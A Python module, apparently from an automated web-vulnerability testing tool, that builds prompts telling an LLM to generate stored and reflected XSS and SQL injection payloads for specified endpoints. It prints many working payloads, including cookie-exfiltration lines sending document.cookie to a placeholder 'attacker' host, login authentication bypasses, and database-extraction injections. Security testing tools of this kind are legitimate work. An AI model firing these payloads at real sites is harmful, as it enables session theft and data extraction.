"""
context_builder.py - LLM 페이로드 생성 프롬프트 빌더

- CMS 특화 코드 없음. point 딕셔너리의 메타데이터를 그대로 사용.
- 예시 페이로드는 포맷 안내용 최소 2~3개만. 실제 커버리지는 baseline/ 담당.
- LLM은 컨텍스트 설명을 읽고 새로운 페이로드를 생성하는 역할.
"""

from typing import Any, Dict


# LLM 시스템 프롬프트
SYSTEM_PROMPT = (
    "You are a cybersecurity expert specializing in web application attacks. "
    "Generate security test payloads for defensive research purposes only. "
    "Output only the required lines in the exact format specified. "
    "No explanations, no headings, no numbering, no bullet points, no blank lines."
)


# ── XSS 빌더 ─────────────────────────────────────────────────────────────────

def build_xss_subject(point: Dict[str, Any], count: int = 5) -> str:
    """Stored XSS - 게시글 제목 필드"""
    url    = point.get("url", "")
    param  = point.get("param", "title")
    method = point.get("method", "POST")
    note   = point.get("note", "")

    return f"""Target: Stored XSS via post title field
Endpoint: {method} {url}, parameter: {param}
Reflection context: Input stored in DB and later rendered as post title (inside anchor or span tags)
{f"Note: {note}" if note else ""}

Known general filter behavior for title fields:
  - <script> tags are commonly blocked
  - Event handlers on non-script tags (onerror, onload, onmouseover) often pass

Generate {count} Stored XSS payloads for a post title field.
Techniques to cover:
1. onerror/onload on img/svg: <img src=x onerror=alert(1)>, <svg/onload=alert(1)>
2. javascript: URI: <a href="javascript:alert(1)">x</a>
3. HTML5 interactive: <details open ontoggle=alert(1)>x</details>
4. CSS animation triggers
5. Encoded/obfuscated variants
6. Cookie exfiltration: fetch('http://attacker/?c='+document.cookie)

ONLY USE THIS TYPE: STORED_XSS
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
STORED_XSS | svg_onload | <svg/onload=alert(1)>
STORED_XSS | a_javascript | <a href="javascript:alert(1)">x</a>"""


def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
    """Stored XSS - 게시글 본문 필드 (HTML 허용)"""
    url    = point.get("url", "")
    param  = point.get("param", "content")
    method = point.get("method", "POST")
    note   = point.get("note", "")

    return f"""Target: Stored XSS via post content field (HTML mode)
Endpoint: {method} {url}, parameter: {param}
Reflection context: HTML content stored and rendered in post body
{f"Note: {note}" if note else ""}

Typical filter behavior:
  - <script> tag blocked
  - Common HTML tags (img, a, p, b) allowed
  - Event handlers on allowed tags often not filtered

Generate {count} Stored XSS payloads for an HTML content field.
Techniques to cover:
1. Event handler on img: <img src=x onerror=alert(1)>
2. javascript: on anchor: <a href=javascript:alert(1)>click</a>
3. SVG/HTML5 elements: <svg/onload=alert(1)>, <details open ontoggle=alert(1)>
4. Video/audio fallback: <video><source onerror=alert(1)></video>
5. Input/form events: <input autofocus onfocus=alert(1)>
6. iframe srcdoc: <iframe srcdoc="<script>alert(1)</script>">
7. Cookie exfil: <img src=x onerror=fetch('http://attacker/?c='+document.cookie)>

ONLY USE THIS TYPE: STORED_XSS
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
STORED_XSS | svg_onload | <svg/onload=alert(1)>
STORED_XSS | iframe_srcdoc | <iframe srcdoc="<script>alert(1)</script>">"""


def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
    """Reflected XSS - 검색창 (value="" 속성 컨텍스트)"""
    url    = point.get("url", "")
    param  = point.get("param", "q")
    method = point.get("method", "GET")
    note   = point.get("note", "")

    return f"""Target: Reflected XSS via search field
Endpoint: {method} {url}, parameter: {param}
Reflection context: Input reflected inside HTML attribute value:
  <input type="text" name="{param}" value="[REFLECTED HERE]">
{f"Note: {note}" if note else ""}

Injection strategy:
  - The " character breaks out of the value="" attribute
  - Stay inside attribute context: close quote, inject event handler, re-open quote
  - Tag breakout may not work if < > are HTML-encoded by the server
  - Backtick syntax alert`1` works as alternative to alert(1)

Generate {count} Reflected XSS payloads for attribute-value context.
Techniques to cover:
1. onmouseover (commonly not filtered): " onmouseover=alert(1) x="
2. Other mouse events: onmouseenter, onmouseleave, onmousedown, onmouseup
3. Form events: oninput, onchange, onkeydown
4. Cookie exfil via confirmed channel: " onmouseover=fetch('http://attacker/?c='+document.cookie) x="
5. Backtick variant: " onmouseover=alert`document.cookie` x="

ONLY USE THIS TYPE: REFLECTED_XSS
REMINDER: every payload MUST start with " and end with x=" to stay inside the attribute
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
REFLECTED_XSS | onmouseover_alert | " onmouseover=alert(1) x="
REFLECTED_XSS | onmouseenter | " onmouseenter=alert(1) x="
REFLECTED_XSS | onmouseover_cookie | " onmouseover=fetch('http://attacker/?c='+document.cookie) x=\""""


def build_xss_comment(point: Dict[str, Any], count: int = 5) -> str:
    """Stored XSS - 댓글 본문"""
    url    = point.get("url", "")
    param  = point.get("param", "content")
    method = point.get("method", "POST")
    note   = point.get("note", "")

    return f"""Target: Stored XSS via comment field
Endpoint: {method} {url}, parameter: {param}
Reflection context: Comment body stored and rendered in post detail page
{f"Note: {note}" if note else ""}

Possible behaviors to test:
  - URLs starting with http:// may be auto-converted to <a href> tags
  - If URL auto-linking exists, inject event handlers into the URL string
  - Direct HTML tags may or may not be filtered

Generate {count} Stored XSS payloads for a comment field.
Techniques to cover:
1. URL attribute injection (if auto-linking exists):
   http://x.com" onmouseover="alert(1)
   http://x.x" onmouseover="alert`1`
2. Direct HTML injection:
   <img src=x onerror=alert(1)>
   <svg/onload=alert(1)>
3. Cookie exfil:
   http://x.x" onmouseover="fetch('http://attacker/?c='+document.cookie)

ONLY USE THIS TYPE: STORED_XSS
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | url_onmouseover | http://x.com" onmouseover="alert(1)
STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
STORED_XSS | svg_onload | <svg/onload=alert(1)>"""


# ── SQLi 빌더 ─────────────────────────────────────────────────────────────────

def build_sqli_orderby(point: Dict[str, Any], count: int = 5) -> str:
    """ORDER BY Injection - 정렬 파라미터"""
    url    = point.get("url", "")
    param  = point.get("param", "sort")
    method = point.get("method", "GET")
    note   = point.get("note", "")

    return f"""Target: SQL Injection via ORDER BY parameter
Endpoint: {method} {url}, parameter: {param}
Injection context: Parameter inserted directly into ORDER BY clause:
  SELECT ... FROM table WHERE ... ORDER BY {{input}}
{f"Note: {note}" if note else ""}

No quote marks surround the injected value.
ORDER BY does NOT allow UNION SELECT directly, but subqueries work.

Generate {count} ORDER BY injection payloads.
Techniques to cover:
1. Time-based blind via SLEEP in subquery:
   (SELECT SLEEP(5))
   IF(1=1,SLEEP(5),col)
2. Boolean-based via CASE WHEN:
   CASE WHEN (1=1) THEN col ELSE col2 END
   CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN col ELSE col2 END
3. Error-based:
   EXTRACTVALUE(1,CONCAT(0x7e,database()))
   UPDATEXML(1,CONCAT(0x7e,user()),1)

ONLY USE THIS TYPE: SQLI_ORDERBY
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
SQLI_ORDERBY | time_sleep | (SELECT SLEEP(5))
SQLI_ORDERBY | bool_case | CASE WHEN (1=1) THEN 1 ELSE 0 END
SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""


def build_sqli_field(point: Dict[str, Any], count: int = 5) -> str:
    """Field Name Injection - SQL WHERE 절 필드명 위치"""
    url    = point.get("url", "")
    param  = point.get("param", "field")
    method = point.get("method", "GET")
    note   = point.get("note", "")

    return f"""Target: SQL Injection via field name parameter
Endpoint: {method} {url}, parameter: {param}
Injection context: Parameter used as column/field name in WHERE clause:
  SELECT * FROM table WHERE {{input}} LIKE '%keyword%'
{f"Note: {note}" if note else ""}

No quote marks surround the field value.
Server may apply a soft whitelist (only known column names allowed).
Strategy: Piggyback on a valid column name, then append SQL injection after it.

Generate {count} SQLi payloads for field name injection.
Techniques to cover:
1. Error-based after valid column:
   col)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
   col)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -
2. Time-based after valid column:
   col)AND(SLEEP(5))-- -
   col)AND(IF(1=1,SLEEP(5),0))-- -
3. Boolean baseline pair:
   col)AND(1=1)-- -
   col)AND(1=2)-- -

Replace "col" with the most likely valid column name for this endpoint.

ONLY USE THIS TYPE: SQLI_FIELD
REMINDER: every payload MUST start with a valid column name
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
SQLI_FIELD | error_db | col)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
SQLI_FIELD | time_sleep | col)AND(SLEEP(5))-- -
SQLI_FIELD | bool_true | col)AND(1=1)-- -"""


def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
    """String Context SQLi - 일반 문자열 파라미터"""
    url    = point.get("url", "")
    param  = point.get("param", "q")
    method = point.get("method", "GET")
    note   = point.get("note", "")
    ctx    = point.get("injection_context", "")

    return f"""Target: SQL Injection via string parameter
Endpoint: {method} {url}, parameter: {param}
Injection context: {ctx if ctx else "String value inside single-quoted SQL context: WHERE col = '{input}'"}
{f"Note: {note}" if note else ""}

Generate {count} SQLi payloads for a string (single-quoted) context.
Techniques to cover:
1. Boolean-based blind:
   ' OR 1=1-- -
   ' AND 1=2-- -
   ' AND LENGTH(database())>0-- -
2. Error-based:
   ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
   ' AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- -
3. Time-based:
   ' AND SLEEP(5)-- -
   ' AND IF(1=1,SLEEP(5),0)-- -
4. UNION-based (if column count known):
   ' UNION SELECT NULL,NULL-- -

ONLY USE THESE TYPES: BOOLEAN, ERROR_BASED, TIME_BASED, UNION
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
BOOLEAN | or_true | ' OR 1=1-- -
ERROR_BASED | extractvalue_db | ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
TIME_BASED | sleep | ' AND SLEEP(5)-- -"""


def build_sqli_login(point: Dict[str, Any], count: int = 5) -> str:
    """Login Form SQLi - 로그인 폼 인증 우회"""
    url    = point.get("url", "")
    param  = point.get("param", "username")
    method = point.get("method", "POST")
    note   = point.get("note", "")

    return f"""Target: SQL Injection via login form
Endpoint: {method} {url}, parameter: {param}
Injection context: Login query with string context:
  SELECT * FROM users WHERE username='{{input}}' AND password=...
{f"Note: {note}" if note else ""}

Generate {count} SQLi payloads for login form authentication bypass or data extraction.
Techniques to cover:
1. Auth bypass (comment out password check):
   admin'-- -
   ' OR '1'='1'-- -
   admin' OR 1=1-- -
2. Tautology without comment:
   ' OR '1'='1
3. Time-based detection:
   ' AND SLEEP(5)-- -
   0 OR SLEEP(5)-- -
4. Error-based:
   ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -

ONLY USE THIS TYPE: SQLI_LOGIN
Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
SQLI_LOGIN | auth_bypass | admin'-- -
SQLI_LOGIN | tautology | ' OR '1'='1'-- -
SQLI_LOGIN | time_sleep | ' AND SLEEP(5)-- -"""


# ── SQLi 빌더 - 일반형 (호환성 유지) ─────────────────────────────────────────

def build_sqli_error(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Error-based
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}
Context: Parameter injected directly into WHERE clause.

Generate {count} Error-based SQL injection payloads.
Sub-techniques: EXTRACTVALUE, UPDATEXML, FLOOR+RAND.

ONLY USE THIS TYPE: ERROR_BASED
Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
ERROR_BASED | extractvalue_db | 0 OR EXTRACTVALUE(1,CONCAT(0x7e,database()))
ERROR_BASED | updatexml_user | 0 OR UPDATEXML(1,CONCAT(0x7e,user()),1)"""


def build_sqli_boolean(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Boolean-based Blind
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}

Generate {count} Boolean-based Blind payloads (True and False variants paired).
Sub-techniques: ASCII+SUBSTRING, LENGTH, CASE WHEN, EXISTS subquery.

ONLY USE THIS TYPE: BOOLEAN
Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
BOOLEAN | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64
BOOLEAN | length_check | 0 OR LENGTH(database())=6"""


def build_sqli_time(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Time-based Blind
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}

Generate {count} Time-based Blind payloads using SLEEP(5).
Sub-techniques: simple SLEEP, IF+SLEEP, CASE WHEN+SLEEP, BENCHMARK.

ONLY USE THIS TYPE: TIME_BASED
Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
TIME_BASED | simple_sleep | 0 OR SLEEP(5)
TIME_BASED | conditional_sleep | 0 OR IF(1=1,SLEEP(5),0)"""


def build_sqli_union(point: Dict[str, Any], columns: int = 3, count: int = 5) -> str:
    return f"""Target SQL injection - Union-based
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}, estimated columns: {columns}

Generate {count} UNION-based payloads.
Sub-techniques: NULL probe, column count enum, version/database/table extraction.

ONLY USE THIS TYPE: UNION
Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
UNION | null_probe | 0 UNION SELECT NULL,NULL,NULL-- -
UNION | version_extract | 0 UNION SELECT version(),NULL,NULL-- -"""


def build_sqli_tautology(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Tautology/Conditional
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}

Generate {count} tautology and conditional payloads.

ONLY USE THESE TYPES: TAUTOLOGY, CONDITIONAL
Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
TAUTOLOGY | numeric_basic | 0 OR (1=1)
CONDITIONAL | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64"""


# ── 라우터 ────────────────────────────────────────────────────────────────────

BUILDERS = {
    # XSS
    "xss_subject":    build_xss_subject,
    "xss_content":    build_xss_content,
    "xss_search":     build_xss_search,
    "xss_comment":    build_xss_comment,

    # SQLi - 컨텍스트별
    "sqli_orderby":   build_sqli_orderby,
    "sqli_field":     build_sqli_field,
    "sqli_string":    build_sqli_string,
    "sqli_login":     build_sqli_login,

    # SQLi - 일반형 (호환성)
    "sqli_error":     build_sqli_error,
    "sqli_boolean":   build_sqli_boolean,
    "sqli_time":      build_sqli_time,
    "sqli_union":     build_sqli_union,
    "sqli_tautology": build_sqli_tautology,
}


def build_prompt(point: Dict[str, Any], vuln_type: str, **kwargs) -> str:
    builder = BUILDERS.get(vuln_type)
    if not builder:
        raise ValueError(
            f"Unsupported vuln_type: {vuln_type}\nAvailable: {list(BUILDERS)}"
        )
    return builder(point, **kwargs)


if __name__ == "__main__":
    sample_point = {
        "url": "/bbs/search.php",
        "method": "GET",
        "param": "stx",
        "db": "MySQL",
    }
    for vtype in ["xss_search", "sqli_string", "sqli_orderby", "sqli_field"]:
        print(f"\n{'='*60}")
        print(f"  [{vtype}]")
        print("=" * 60)
        print(build_prompt(sample_point, vtype))
